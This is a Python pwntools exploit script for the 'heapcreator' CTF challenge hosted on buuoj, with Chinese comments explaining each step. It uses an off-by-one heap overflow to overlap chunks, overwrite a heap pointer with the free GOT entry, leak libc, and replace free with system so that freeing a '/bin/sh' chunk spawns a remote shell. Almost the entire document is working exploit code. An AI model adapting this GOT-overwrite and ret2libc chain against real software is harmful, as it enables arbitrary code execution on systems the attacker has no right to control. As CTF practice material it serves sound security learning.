from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './heapcreator'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29396) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b':',b'1')
    sla(b'Size of Heap : ',int2bytes(len))
    sa(b'Content of heap:',content)

def show(index):
    sla(b':',b'3')
    sla(b':',int2bytes(index))

def edit(index,content):
    sla(b':',b'2')
    sla(b'Index :',int2bytes(index))
    sa(b'Content of heap : ',content)

def delete(index):
    sla(b':',b'4')
    sla(b':',int2bytes(index))


# struct{
# 	int* buf(size, char* content);
# }



free_got = elf.got['free']

add(0x18) #0  0x10 0x18
add(0x10) #1  0x10 0x10
# payload = b'/bin/sh\x00' + b'a'*0x10 + p64(41)
# 这里写错了，还是之前无限制堆溢出的思路，但这里是off_by_one只能溢出一个字节
payload = b'/bin/sh\x00' + b'a'*0x10 + b'\x41'
edit(0,payload)
delete(1) # 0x40和0x20的fastbin
payload = p64(0)*4 + p64(0x30) + p64(free_got) #0x30代表content size大小
add(0x30,payload)# 1
# 原本chunk 1的size chunk 变成了content chunk且size变大，覆盖了整个content和size chunk
# 原本的content chunk 变成了size chunk

show(1)
free_addr = uu64(ru(b'\x7f',drop=False)[-6:])
print(hex(free_addr))
system_addr, bin_sh_addr = ret2libc(free_addr,'free')

edit(1,p64(system_addr))#注意这步很关键，即因为已经将chunk2的指针覆盖为free_got地址，所以edit直接修改free_got值
delete(0)
itr()